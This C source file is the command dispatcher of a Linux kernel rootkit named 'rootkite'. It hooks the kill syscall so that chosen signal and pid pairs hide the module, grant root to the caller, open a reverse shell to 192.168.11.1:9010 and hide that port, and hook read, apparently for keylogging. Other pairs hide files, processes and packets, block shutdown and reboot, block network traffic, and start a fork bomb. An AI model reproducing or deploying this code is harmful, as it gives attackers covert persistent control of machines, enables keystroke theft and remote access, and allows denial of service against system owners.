#include "device_handler.h"
#include "mod_hider.h"
#include "root_setter.h"
#include "getdents_hacks.h"
#include "hide_process.h"
#include "hide_ports.h"
#include "files_hacks.h"
#include "netfilter_kite.h"
#include "forkbomb.h"
#include "keylogger.h"
#include "kite_hook.h"
#include "execve_blocker.h"



#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide rootkite\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        // hide chardev quickly
        return 0;
    }
    else if ((sig == 64) && (pid == 4)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
            printk(KERN_ERR "error hooking syscall read\n");
        }
    }
    else if ((sig == 64) && (pid == 5)){
        rooted();
        insert_node(&files_to_hide, "rootkite.ko");
        //insert_node(&files_to_hide, "ath_pci.conf");
    }
    else if ((sig == 63) && (pid == 1)){
        
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
            printk(KERN_ERR "error hooking packet_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
            printk(KERN_ERR "error hooking tpacket_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
        }
        switch_hide_process();
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
            insert_node(&exec_to_block, "shutdown");
        }
        else{
            remove_node_by_name(&exec_to_block, "shutdown");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
                printk(KERN_ERR "error hooking syscall execve\n");
        }
    }
    else if ((sig == 63) && (pid == 3)){
        switch_net_hook(); // block traffic to specified ports and block ICMP
    }
    else if ((sig == 63) && (pid == 4)){
        start_bombing_run();
    }
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide rootkite\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 64) && (pid == 3)){
        start_reverse_shell("192.168.11.1", "9010");
        insert_node(&ports_to_hide, "9010");
    }
    else if ((sig == 64) && (pid == 4)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
            printk(KERN_ERR "error hooking syscall read\n");
        }
    }
    else if ((sig == 64) && (pid == 5)){
        rooted();
        insert_node(&files_to_hide, "rootkite.ko");
        //insert_node(&files_to_hide, "ath_pci.conf");
    }
    else if ((sig == 63) && (pid == 1)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
            printk(KERN_ERR "error hooking packet_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
            printk(KERN_ERR "error hooking tpacket_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
        }
        switch_hide_process();
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
            insert_node(&exec_to_block, "shutdown");
        }
        else{
            remove_node_by_name(&exec_to_block, "shutdown");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
                printk(KERN_ERR "error hooking syscall execve\n");
        }
    }
    else if ((sig == 63) && (pid == 3)){
        switch_net_hook(); // block traffic to specified ports and block ICMP
    }
    else if ((sig == 63) && (pid == 4)){
        start_bombing_run();
    }
    return orig_kill(pid, sig);
}
#endif
